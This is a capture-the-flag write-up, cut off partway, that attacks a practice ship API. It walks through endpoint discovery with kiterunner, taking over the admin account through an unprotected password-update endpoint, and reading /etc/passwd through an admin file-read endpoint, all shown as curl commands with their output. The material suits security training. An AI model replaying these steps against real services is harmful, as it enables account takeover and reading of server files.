Below deck troubles: U.S.A.
====================================

## Task
Ahoy, officer,

on our last port visit, a new U.S.A. (Universal Ship API) interface was installed on the ship. In order to unlock new experimental ship functions, the special code has to be entered into ship FLAG (First Layer Application Gateway). Your task is to get this FLAG code from U.S.A.

May you have fair winds and following seas!

The U.S.A. is available at http://universal-ship-api.cns-jv.tcc.

## Solution
So, let's try some requests:

	┌──(kali㉿kali)-[~]
	└─$ curl http://universal-ship-api.cns-jv.tcc 
	{"msg":"Naval ship API version 1.0"}                                                                                                                    
	┌──(kali㉿kali)-[~]
	└─$ curl http://universal-ship-api.cns-jv.tcc/api
	{"endpoints":["v1"]}                                                                                                                    
	┌──(kali㉿kali)-[~]
	└─$ curl http://universal-ship-api.cns-jv.tcc/api/v1
	{"endpoints":["user","admin"]}                                                                                                                    
	┌──(kali㉿kali)-[~]
	└─$ curl http://universal-ship-api.cns-jv.tcc/api/v1/user
	{"detail":"Not Found"}                                                                                                                    
	┌──(kali㉿kali)-[~]
	└─$ curl http://universal-ship-api.cns-jv.tcc/api/v1/user/login
	{"detail":"Not authenticated"}                                                                                         
	┌──(kali㉿kali)-[~]
	└─$ curl http://universal-ship-api.cns-jv.tcc/api/v1/admin/  
	{"detail":"Not authenticated"}                                                                                                                    
	┌──(kali㉿kali)-[~]
	└─$ curl http://universal-ship-api.cns-jv.tcc/docs         
	{"detail":"Not authenticated"}

Ok, we have api on /api/v1, we have user and admin endpoints and probably some documentation on /docs. But still nothing useful. We need some tool to find something. After few tries I end up with kiterunner (https://github.com/assetnote/kiterunner) and using wordlist from repository (and give it some time):


	└─$ ./kr scan http://universal-ship-api.cns-jv.tcc/api/v1/ -w routes-large.kite -x20 -j100 -d 3                                                                            
	                                                                                                                    
	PATCH   405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/personalCenter 0cf68bb77e0d5fe9485069f0c013b1fb33d21b1c
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/mobiles 0cf681e9997e9ca13dc7562b22966880964b34c9
	POST    422 [    169,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/signup 0cf683cc4bd02f4f11521bd882ee8ed09b9397e8
	POST    422 [    169,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/signup 0cf6843d478efe62fe127c180987e4c0baa4f1c0
	POST    422 [    169,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/signup 0cf688b9a550d7026d901ba3339b42ee9d73d0fd
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/toCash 0cf6891ec54e1f75c4770806fa5954524491a0c2
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/createGuildLeader 0cf682f5d8cfa2066bf645993df28365355ac14d
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/updateUser 0cf68358b2c38bd9a62203254dfe1c605b3950a3
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/get-by-email 0cf68bf505e4db403eb3bc58f85c11a384a6df7d
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/updateUserRole 0cf68542c59dc34a18ce055658b62e11714b7b3a
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/contactUs 0cf68369ca473cc571b87d70da7411f30b610b8d
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/modify 0cf6816e4420bf5ec9d40f8212efaf1142dfbd3f
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/kyc 0cf682c6287afb02caa28048df983cb1829dc2d6
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/getAuthList 0cf683a101cfb7e4b3e9ff94849b9ca93e91d4ce
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/create 0cf682e3d18fdcba0506570ac3b8efa7e2d6e444
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/create 0cf683d2cd8b89a81eea6351807107f29bb76607
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/update.json 0cf685a9b2057c58a4baf36bc1d08b44fac0b996
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/save_comment 0cf681eb71dde1e740ee430e45b27fbe1d32b5af
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/uploadFace 0cf684347f6563f549b2d24f3a1d3e23fd12a0da
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/sendfeedback 0cf6854ec2704524136f4ac125a6583b0ace5010
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/changephone 0cf6887c364bb23f9e65c235cf897279ba97c9dc
	PUT     405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/init 0cf684fcfee0b1f10d5489967e4fa8e78fee27cf
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/loadManagersByParentDeptId 0cf68a4ce07d7b4c013d0238a071f4e2d334dcfb
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/updateUserPhone 0cf689c6d75dc189763b6650a46123782ca2cf18
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/batchUpdateUserAvatars 0cf68bc3ee82be8ab84518c05bff88a3a729a55d
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/add-item-grocery-list 0cf689db440dd84eb04e46d3b45b201b8a91bc15
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/changepassword 0cf68230d6028b0a4dcc2fca924bb7b8734d4733
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/register 0cf6814d8d05cb52eb5611ccc784b1e1493e913b
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/register 0cf681de2109ed11d0b4ecd8dc3a02d6decbcf88
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/register 0cf6825880729ff10efe08255c0650d806f52527
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/register 0cf68403b6ad38f120d21542196585ad0a39f4b0
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/register 0cf685dd2bce26734a4e7fa4791355a26bb2b5e0
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/register 0cf6891f9324853faf8ba78b89ca17856a9af9de
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/register 0cf6897bef92264f11e637047b16d183054e3e46
	PATCH   405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/hotel 0cf681782160f11e857aa8830f3c5f00bd2b0bd2
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/add 0cf68151e95b42ffbc6485a80033089a8202758f
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/add 0cf68c02fa7423249df2ef824fdc1e1e719e0f84
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/withdraw 0cf688bbf766ca55b66e645d2c5389580d4d7c39
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/list 0cf68845ec0d1980804ea32f6593b1484ef1e3c8
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/coverEdit 0cf6880a753d2b5691d81cfc542b3f2f15985db0
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/auth 0cf68a69041e3d004b46e5c104947d9f62db1461
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/logout 0cf682cf669e274adda5a30393ba7aa0726b465c
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/userlogin 0cf682dfaba40d80ef309df8352a884ad476fa86
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/socialRegister 0cf682c42afdb6d36088e8154cca8ea73257cc96
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/merge 0cf681b99117c591f3c804a265eb4f44740d12b2
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/sendPANMsg 0cf68c0521effcd0dcd12f1e83a158dd0066b868
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/changeUserPayPass 0cf6829c720e47c0e2af627bd466e3b8a7c1167c
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/registercustomer 0cf68301e9d1c5a8b6d218a263a60e2b199103a7
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/resetpassword 0cf684cf1107a0b6fee3fe327afe62597b5ad4d4
	PUT     405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/resetpassword 0cf6859b45f66e83a3dfbcfbd3376ed440a3f6ad
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/user-edit-info 0cf68c2ae65dcfb1a80bd99a0e1dec53cae5399c
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/passUser 0cf68522b4c80dceea0588652fda29c14188f911
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/token 0cf68423918ef7f7b67184717d8e4a0d0de9cdf8
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/checkPassword 0cf683b86a139753537545f6a7f5629611bb05ca
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/wxLogin 0cf688dc3ada25b1fc54c03dc5414f9d17be8753
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/updatePayPassword 0cf689cb901b9235124b52c7e216490983b55f61
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/retrievePassword 0cf6822e8c4d1d6c645de711eab02fe40d1f4acd
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/getFilterAvailableCoupons 0cf6851990557026cf499e158e46235b96657198
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/register_or_login.do 0cf6855b2e3d6373e2b31f65b1c8552f66e454cf
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/queryCoinWater 0cf684cf6218d0d587a3b651d33dbbedbc2c24dd
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/createUser 0cf685cca4f2ed1881e9fc3620faf17c910d7850
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/29860232 0cf683cda78f3b8d78cf64b8f3a857f7e20e49a6
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/loginByWeChat 0cf686113b864d66b7fbc25ef3d5612c853b411b
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/save 0cf683f22360f85dd7db9de0213642f85a952af7
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/sendValidCode 0cf682af877dfb511cff7b30872cefb6db7bbbfe
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/updatePassword 0cf6837dc063faf446ae5879f7480079f489956e
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/updatePassword 0cf68ac89943ed364eeaef25b1cd76b7d945bfcc
	POST    405 [     31,    3,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/addOpenTime 0cf682ff3ff47076caf00795ccf1f7b56d08790b
	GET     401 [     43,    4,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/login 0cf68388e77bab2ad848668027a5c60dc63d7307
	POST    400 [     43,    4,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/login 0cf685c14b645f9505187d0e64e45c6a688aa513
	 100% |█████| (301174/301174, 433 it/s)               
	6:45PM INF finished quick scan routes=3278 targets=1  
	GET     401 [     43,    4,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/sureorder 0cf68388e77bab2ad848668027a5c60dc63d7307
	GET     401 [     43,    4,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/login 0cf68388e77bab2ad848668027a5c60dc63d7307
	POST    400 [     43,    4,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/login 0cf685c14b645f9505187d0e64e45c6a688aa513
	GET     401 [     43,    4,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/reservate 0cf68388e77bab2ad848668027a5c60dc63d7307
	GET     401 [     43,    4,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/detailstest 0cf68388e77bab2ad848668027a5c60dc63d7307
	GET     401 [     43,    4,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/test 0cf68388e77bab2ad848668027a5c60dc63d7307
	GET     401 [     43,    4,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/checkcode 0cf68388e77bab2ad848668027a5c60dc63d7307
	GET     401 [     43,    4,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/submit 0cf68388e77bab2ad848668027a5c60dc63d7307
	GET     401 [     43,    4,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/orderdetails 0cf68388e77bab2ad848668027a5c60dc63d7307
	POST    422 [     88,    6,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/signup 0cf68230d6028b0a4dcc2fca924bb7b8734d4733
	GET     401 [     43,    4,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/details 0cf68388e77bab2ad848668027a5c60dc63d7307
	GET     401 [     43,    4,   1] http://universal-ship-api.cns-jv.tcc/api/v1//user/index 0cf68388e77bab2ad848668027a5c60dc63d7307
	 100% |█████| (37257/37257, 434 it/s)            
	6:46PM INF scan complete duration=793817.790872 results=12

Between a lot of 405 method not allowed and 401 unauthorized are few exceptions: /user/login and /user/signup. Let's look on this:

	└─$ curl -XPOST http://universal-ship-api.cns-jv.tcc/api/v1/user/signup 
	{"detail":[{"loc":["body"],"msg":"field required","type":"value_error.missing"}]} 

It seems promissing. We can guess, that at least username parameter should be present. So we send it:

	└─$ curl -XPOST -H "Content-type: application/json" -d '{"username": "spm"}' http://universal-ship-api.cns-jv.tcc/api/v1/user/signup
	{"detail":[{"loc":["body","email"],"msg":"field required","type":"value_error.missing"},{"loc":["body","password"],"msg":"field required","type":"value_error.missing"}]}  

and API tell us what is missing:
	└─$ curl -XPOST -H "Content-type: application/json" -d '{"username": "spm", "email": "nah@spamik.cz", "password": "abcdef"}' http://universal-ship-api.cns-jv.tcc/api/v1/user/signup
	{}

Good. Let's try login. For some reason login method won't accept sent json data. But sending it asi form data works (if we user email as username):

	└─$ curl -XPOST -d username=nah@spamik.cz -d password=abcdef http://universal-ship-api.cns-jv.tcc/api/v1/user/login
	{"access_token":"eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk4MzYyNTEyLCJpYXQiOjE2OTc2NzEzMTIsInN1YiI6IjIiLCJhZG1pbiI6ZmFsc2UsImd1aWQiOiJlMjNjNDZjZC1mZmM3LTQ1MDctYmZlMy05ZmViYjBjODk5MTkifQ.RoENKKNlG_xLUgfAbVrIwu-B2OndDEYmWMNopb11gCKgS88tIIzZp7l1bnTfCBKmvqp3_rMLY8G1bMPw-zI2l_S17X60gd5tmT-SP1t9HWnYwa2pEjHTLnmfQKxPUQHxc4eqLMkXhxDrvT4QAbhAvsZFE_GoJ2d3bmDiS16iUJZsQN3RQhaX1QXfat64yBpI6e7lWNGQQeABDsRuVJgyBCdtL5GbYGKtEdyWNd4dathx83PX4hMIzHhRDhWhchOoCBLhRYaiq_DDQukwomG7cDGO-KrZ7QvliHDnmDG_FmoOS-cSbRHQXv8EobBcDmRs2BJ3pC19nnXp0d0WVLuOnvrT413u3lC2Ttm3sEvPFf4epjjipAKLAOd1-XX22t7GzQMZ4M6lOYpPNzSh62ulKrOD7DU-mp0z1sRTyKajtRMmPi6McaHqh0gS1pS6xBi75Quvb738sMVrhSzBwNnAlWVrbebOvBfob-eUIFTr7KTXPrdgM7CDU9HztZL2kM71XGlVJuBrUNEVsobuty0w7_sgs9Vsmai54s7wqW9cPxZCTOVTOLUavbIyBTRx36jR9V3JaSQMvakKbfkoCez0eKEGf0AgaXykxxeu1QUqUY87cE0nKjQ3JMkv04-Q52lq3CjjHrLuJzCGlFk2SYMfdnQgpBowcJgHdEAXlfE7VaE","token_type":"bearer"}  

We have authentication token. Let's use it and try something which previously returned unauthorized:

	└─$ curl -H "Authorization: Bearer eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk4MzYyNTEyLCJpYXQiOjE2OTc2NzEzMTIsInN1YiI6IjIiLCJhZG1pbiI6ZmFsc2UsImd1aWQiOiJlMjNjNDZjZC1mZmM3LTQ1MDctYmZlMy05ZmViYjBjODk5MTkifQ.RoENKKNlG_xLUgfAbVrIwu-B2OndDEYmWMNopb11gCKgS88tIIzZp7l1bnTfCBKmvqp3_rMLY8G1bMPw-zI2l_S17X60gd5tmT-SP1t9HWnYwa2pEjHTLnmfQKxPUQHxc4eqLMkXhxDrvT4QAbhAvsZFE_GoJ2d3bmDiS16iUJZsQN3RQhaX1QXfat64yBpI6e7lWNGQQeABDsRuVJgyBCdtL5GbYGKtEdyWNd4dathx83PX4hMIzHhRDhWhchOoCBLhRYaiq_DDQukwomG7cDGO-KrZ7QvliHDnmDG_FmoOS-cSbRHQXv8EobBcDmRs2BJ3pC19nnXp0d0WVLuOnvrT413u3lC2Ttm3sEvPFf4epjjipAKLAOd1-XX22t7GzQMZ4M6lOYpPNzSh62ulKrOD7DU-mp0z1sRTyKajtRMmPi6McaHqh0gS1pS6xBi75Quvb738sMVrhSzBwNnAlWVrbebOvBfob-eUIFTr7KTXPrdgM7CDU9HztZL2kM71XGlVJuBrUNEVsobuty0w7_sgs9Vsmai54s7wqW9cPxZCTOVTOLUavbIyBTRx36jR9V3JaSQMvakKbfkoCez0eKEGf0AgaXykxxeu1QUqUY87cE0nKjQ3JMkv04-Q52lq3CjjHrLuJzCGlFk2SYMfdnQgpBowcJgHdEAXlfE7VaE" http://universal-ship-api.cns-jv.tcc/docs

	    <!DOCTYPE html>
	    <html>
	    <head>
	    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui.css">
	    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
	    <title>Naval ship API docs</title>
	    </head>
	    <body>
	    <div id="swagger-ui">
	    </div>
	    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui-bundle.js"></script>
	    <!-- `SwaggerUIBundle` is now available on the page -->
	    <script>
	    const ui = SwaggerUIBundle({
	        url: '/openapi.json',
	    
	        dom_id: '#swagger-ui',
	        presets: [
	        SwaggerUIBundle.presets.apis,
	        SwaggerUIBundle.SwaggerUIStandalonePreset
	        ],
	        layout: "BaseLayout",
	        deepLinking: true,
	        showExtensions: true,
	        showCommonExtensions: true
	    })
	    </script>
	    </body>
	    </html>

Cool. If we use some extension in normal browser to add authorization header, we get nice API documentation :-) I did this and these seems like interesting endpoints:
- GET /api/v1/user/{user_id}
- POST /api/v1/user/updatepassword
- GET /api/v1/admin/
- POST /api/v1/admin/file
- PUT /api/v1/admin/getFlag

I've tried file and getFlag but in both cases I got permission error. /admin says false, that will be the reason. So what? Let's look on first user in system:

	└─$ curl -H "Authorization: Bearer eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk4MzYyNTEyLCJpYXQiOjE2OTc2NzEzMTIsInN1YiI6IjIiLCJhZG1pbiI6ZmFsc2UsImd1aWQiOiJlMjNjNDZjZC1mZmM3LTQ1MDctYmZlMy05ZmViYjBjODk5MTkifQ.RoENKKNlG_xLUgfAbVrIwu-B2OndDEYmWMNopb11gCKgS88tIIzZp7l1bnTfCBKmvqp3_rMLY8G1bMPw-zI2l_S17X60gd5tmT-SP1t9HWnYwa2pEjHTLnmfQKxPUQHxc4eqLMkXhxDrvT4QAbhAvsZFE_GoJ2d3bmDiS16iUJZsQN3RQhaX1QXfat64yBpI6e7lWNGQQeABDsRuVJgyBCdtL5GbYGKtEdyWNd4dathx83PX4hMIzHhRDhWhchOoCBLhRYaiq_DDQukwomG7cDGO-KrZ7QvliHDnmDG_FmoOS-cSbRHQXv8EobBcDmRs2BJ3pC19nnXp0d0WVLuOnvrT413u3lC2Ttm3sEvPFf4epjjipAKLAOd1-XX22t7GzQMZ4M6lOYpPNzSh62ulKrOD7DU-mp0z1sRTyKajtRMmPi6McaHqh0gS1pS6xBi75Quvb738sMVrhSzBwNnAlWVrbebOvBfob-eUIFTr7KTXPrdgM7CDU9HztZL2kM71XGlVJuBrUNEVsobuty0w7_sgs9Vsmai54s7wqW9cPxZCTOVTOLUavbIyBTRx36jR9V3JaSQMvakKbfkoCez0eKEGf0AgaXykxxeu1QUqUY87cE0nKjQ3JMkv04-Q52lq3CjjHrLuJzCGlFk2SYMfdnQgpBowcJgHdEAXlfE7VaE" -XGET http://universal-ship-api.cns-jv.tcc/api/v1/user/1    
	{"guid":"b0d3d349-15a3-4fb7-a37e-baf645f5baa2","email":"admin@local.tcc","date":null,"time_created":1690796892351,"admin":true,"id":1} 

And now we can try updatepassowrd:

	└─$ curl -H "Authorization: Bearer eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk4MzYyNTEyLCJpYXQiOjE2OTc2NzEzMTIsInN1YiI6IjIiLCJhZG1pbiI6ZmFsc2UsImd1aWQiOiJlMjNjNDZjZC1mZmM3LTQ1MDctYmZlMy05ZmViYjBjODk5MTkifQ.RoENKKNlG_xLUgfAbVrIwu-B2OndDEYmWMNopb11gCKgS88tIIzZp7l1bnTfCBKmvqp3_rMLY8G1bMPw-zI2l_S17X60gd5tmT-SP1t9HWnYwa2pEjHTLnmfQKxPUQHxc4eqLMkXhxDrvT4QAbhAvsZFE_GoJ2d3bmDiS16iUJZsQN3RQhaX1QXfat64yBpI6e7lWNGQQeABDsRuVJgyBCdtL5GbYGKtEdyWNd4dathx83PX4hMIzHhRDhWhchOoCBLhRYaiq_DDQukwomG7cDGO-KrZ7QvliHDnmDG_FmoOS-cSbRHQXv8EobBcDmRs2BJ3pC19nnXp0d0WVLuOnvrT413u3lC2Ttm3sEvPFf4epjjipAKLAOd1-XX22t7GzQMZ4M6lOYpPNzSh62ulKrOD7DU-mp0z1sRTyKajtRMmPi6McaHqh0gS1pS6xBi75Quvb738sMVrhSzBwNnAlWVrbebOvBfob-eUIFTr7KTXPrdgM7CDU9HztZL2kM71XGlVJuBrUNEVsobuty0w7_sgs9Vsmai54s7wqW9cPxZCTOVTOLUavbIyBTRx36jR9V3JaSQMvakKbfkoCez0eKEGf0AgaXykxxeu1QUqUY87cE0nKjQ3JMkv04-Q52lq3CjjHrLuJzCGlFk2SYMfdnQgpBowcJgHdEAXlfE7VaE" -XPOST -H "Content-type: application/json" -d '{"email": "admin", "guid": "b0d3d349-15a3-4fb7-a37e-baf645f5baa2", "password": "abcdef"}' http://universal-ship-api.cns-jv.tcc/api/v1/user/updatepassword
	{"guid":"b0d3d349-15a3-4fb7-a37e-baf645f5baa2","email":"admin@local.tcc","date":null,"time_created":1690796892351,"admin":true,"id":1} 

Seems working. So now repeat login procedure to get new authentication token and try again:

	└─$ curl -H "Authorization: Bearer eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk4MzYzMzg1LCJpYXQiOjE2OTc2NzIxODUsInN1YiI6IjEiLCJhZG1pbiI6dHJ1ZSwiZ3VpZCI6ImIwZDNkMzQ5LTE1YTMtNGZiNy1hMzdlLWJhZjY0NWY1YmFhMiJ9.nDpeQ-cJaPTb9VQboXeRJCjaUTh6QYoEv0egm4wJUzO7w7YjsBwAgEY2t_TZt4r78HhlN2bY0gxhsfXrXzMdBfJz4isoCC0vEeOqNu2kaBvyIw4brJsRcmy_-aOHB-zJ7nmw-plF7_FSPbena_Apl-saE9YGjHCeGDvObxDVcpahMO07pgF0YvBPLJLYMm-MVP-1GQ5d-KbR9V0emJoRWCjDvhv3CseFZvLabTDze3k6xarrv5Argh9MUJtuEHAjwki6YY6YzVsULhR_YQeyjse5qcf2n97cpsEulgyWfGYpzeDuV1eH3A3w1k__smYnaaVb05W5NQ1MFGxIE1NgnZGEq4vTZstuO4mgZ9yDpkwwRcowCRNWiKY_AsCnAahG7D-Qe0UBMur5yzR8AFTtf13H8mYKLn4Y4DvxOV9eeu2BdzAwGrqwCy9xNxOaTitaj7gVU7BM_M6qwr9x6Jh7vK5aR88Jbn6sBXeCsyXqTjA3pvCXgIlUI1l1BhoSv7Ezv-aRE_j3Bxw8d5vi_xfzZbRtfl1Kn1W67AwAZh2CSnHgCDR5M4MI1q1RSPXX5QOQSJpS052gxg69TnwW_6EoP2TAQqLdsqIYhejFbFbXxa_6EFrssFOWuGmwyrjf1SLNSQ6Ac8DPjyxFdHSJREMeobSZrAuVkcMi2FzrI1zgUGY" -XGET http://universal-ship-api.cns-jv.tcc/api/v1/admin/ 
	{"results":true} 

Good. What about getFlag?

	{"detail":"flag-read key missing from JWT"} 

Not good. What about file (I've added some shell magic to get more readable output)?

	└─$ curl -s -H "Authorization: Bearer eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk4MzYzMzg1LCJpYXQiOjE2OTc2NzIxODUsInN1YiI6IjEiLCJhZG1pbiI6dHJ1ZSwiZ3VpZCI6ImIwZDNkMzQ5LTE1YTMtNGZiNy1hMzdlLWJhZjY0NWY1YmFhMiJ9.nDpeQ-cJaPTb9VQboXeRJCjaUTh6QYoEv0egm4wJUzO7w7YjsBwAgEY2t_TZt4r78HhlN2bY0gxhsfXrXzMdBfJz4isoCC0vEeOqNu2kaBvyIw4brJsRcmy_-aOHB-zJ7nmw-plF7_FSPbena_Apl-saE9YGjHCeGDvObxDVcpahMO07pgF0YvBPLJLYMm-MVP-1GQ5d-KbR9V0emJoRWCjDvhv3CseFZvLabTDze3k6xarrv5Argh9MUJtuEHAjwki6YY6YzVsULhR_YQeyjse5qcf2n97cpsEulgyWfGYpzeDuV1eH3A3w1k__smYnaaVb05W5NQ1MFGxIE1NgnZGEq4vTZstuO4mgZ9yDpkwwRcowCRNWiKY_AsCnAahG7D-Qe0UBMur5yzR8AFTtf13H8mYKLn4Y4DvxOV9eeu2BdzAwGrqwCy9xNxOaTitaj7gVU7BM_M6qwr9x6Jh7vK5aR88Jbn6sBXeCsyXqTjA3pvCXgIlUI1l1BhoSv7Ezv-aRE_j3Bxw8d5vi_xfzZbRtfl1Kn1W67AwAZh2CSnHgCDR5M4MI1q1RSPXX5QOQSJpS052gxg69TnwW_6EoP2TAQqLdsqIYhejFbFbXxa_6EFrssFOWuGmwyrjf1SLNSQ6Ac8DPjyxFdHSJREMeobSZrAuVkcMi2FzrI1zgUGY" -XPOST -H "Content-type: application/json" -d '{"file": "/etc/passwd"}' http://universal-ship-api.cns-jv.tcc/api/v1/admin/file | jq .file | awk '{gsub(/\\n/,"\n")}1'
	"root:x:0:0:root:/root:/bin/bash
	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
	bin:x:2:2:bin:/bin:/usr/sbin/nologin
	sys:x:3:3:sys:/dev:/usr/sbin/nologin
	sync:x:4:65534:sync:/bin:/bin/sync
	games:x:5:60:games:/usr/games:/usr/sbin/nologin
	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
	irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
	_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
	appuser:x:1000:1000::/home/appuser:/bin/sh

Perfect. So, we can read files on file system. But probably we can list directories, that's odd. Now will be helpful if we find application sourcecode (probably is in python if it's server by uvicorn). So... Idea: let's get `/proc/1/status`. This get some statistics about process with PID 1. On Linux systems it's usually init system - first process which is run after boot. This will probably not help but on the other hand most of the challenges apps run in docker and in this case we can find something more interesting. And yes, if we look on Name field it says uvicorn. So now we try /proc/1/cmdline and we got arguments for uvicorn:

